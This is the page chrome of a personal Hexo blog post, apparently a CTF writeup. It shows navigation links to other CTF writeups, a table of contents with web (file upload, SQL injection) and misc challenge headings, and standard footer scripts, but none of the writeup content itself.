+              <a href="/2019/06/06/ciscn2019/" rel="next" title="ciscn2019 writeup">
+                <i class="fa fa-chevron-left"></i> ciscn2019 writeup
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/06/26/SCTF2019/" rel="prev" title="SCTF2019 writeup">
+                SCTF2019 writeup <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">0pa9ue</p>
+              <p class="site-description motion-element" itemprop="description">stay hungry, stay foolish</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/%7C%7C%20archive">
+              
+                  <span class="site-state-item-count">24</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                
+                  <span class="site-state-item-count">42</span>
+                  <span class="site-state-item-name">tags</span>
+                
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Web"><span class="nav-number">1.</span> <span class="nav-text">Web</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#upload"><span class="nav-number">1.1.</span> <span class="nav-text">upload</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#随便注"><span class="nav-number">1.2.</span> <span class="nav-text">随便注</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#强网先锋-上单"><span class="nav-number">1.3.</span> <span class="nav-text">强网先锋-上单</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Misc"><span class="nav-number">2.</span> <span class="nav-text">Misc</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#鲲or鳗orGame"><span class="nav-number">2.1.</span> <span class="nav-text">鲲or鳗orGame</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#强网先锋-打野"><span class="nav-number">2.2.</span> <span class="nav-text">强网先锋-打野</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">0pa9ue</span>
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+      <span class="post-meta-item-text">Site words total count&#58;</span>
+    
+    <span title="Site words total count">44.4k</span>
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.4</div>
+
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+  
+
+
+  
+
+  
+
+</body>
+</html>
